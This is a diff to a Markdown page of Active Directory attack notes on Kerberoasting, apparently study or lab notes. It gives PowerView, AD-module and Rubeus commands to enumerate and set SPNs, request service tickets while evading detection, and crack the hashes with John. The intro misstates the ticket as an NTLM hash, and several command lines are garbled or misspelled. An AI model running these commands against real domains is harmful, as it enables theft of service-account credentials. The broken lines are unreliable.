@@ -1,8 +1,7 @@
 # Kerberoast
 
-In a Kerberoast attack, the attacker requests a Kerberos session ticket (TGS)  to retrieve the service account's NTLM hash, which is partially encrypted with the service account's hash. \
-This hash is then cracked offline to extract the service account's password.\
-
+In a Kerberoast attack, the attacker requests a Kerberos session ticket (TGS) to retrieve the service account's NTLM hash, which is partially encrypted with the service account's hash.\
+This hash is then cracked offline to extract the service account's password.
 
 ## SPNs
 
@@ -20,11 +19,23 @@ Get-DomainUser -SPN
 Get-ADUser -Filter {Servicer -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalNameGet-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalNameGet-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName
 ```
 {% endtab %}
+
+{% tab title="Rubeus.exe" %}
+```
+Rubeus.exe kerberoast /stats
+```
+{% endtab %}
 {% endtabs %}
+
+{% hint style="info" %}
+**If an account has SPN value set then TGS can be requested for that account.**
+{% endhint %}
 
 ## Set SPNs
 
-With enough rights (GenericAll/GenericWrite), a target user's SPN can be set
+With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain)
+
+We can then request a TGS without special privileges. The TGS can then be "Kerberosated" instead of we resetting the password of the user with the GenericAll/GenericWrite rights.
 
 {% tabs %}
 {% tab title="PowerView" %}
@@ -34,16 +45,26 @@ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDP
 
 # Set SPN
 Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}
+```
+{% endtab %}
 
+{% tab title="AD Module" %}
+```powershell
+Set-ADUser -Identify <username> -ServicePrincipalNames @{Add='ops/whatever1'}
 ```
 {% endtab %}
 {% endtabs %}
+
+{% hint style="warning" %}
+Remember the SPN name should be in the **form string/string** and it should be **UNIQUE across the FOREST**.
+{% endhint %}
 
 ## TGS
 
 ```powershell
 # try to downgrade to RC4-HMAC and get hashes
-Rubeus.exe kerberoast 
+# Prone to detection as the same machine is requesting TGS's for all the services back to back
+Rubeus.exe kerberoast
 
 # to avoid detections look for Kerberoastable accounts that only support RC4_HMAC
 Rubeus.exe kerberoast /rc4opsec
@@ -63,4 +84,3 @@ Rubeus.exe kerberoast /user:svcadmin  /rc4opsec
 ```powershell
 john.exe --wordlist=C:\AD\Tools\kerberoast\10kworst-pass.txt C:\AD\Tools\hashes.txt
 ```
-
